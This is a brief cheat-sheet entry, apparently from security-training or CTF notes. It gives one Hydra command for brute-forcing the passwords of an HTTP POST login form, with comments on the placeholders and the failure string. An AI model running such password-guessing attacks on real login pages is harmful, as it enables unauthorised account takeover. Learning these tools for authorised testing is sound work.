# Hydra
```
# using hydra to brute force a POST form  
hydra -l <username> -P <wordlist> <ip> http-post-form "/page:username=^USER^&password=^PASS^:F=incorrect" -V  
# where:
# username=         the form field  
# ^USER^            the fuzz  
# :F=incorrect      if incorrect appears, failed pass
```

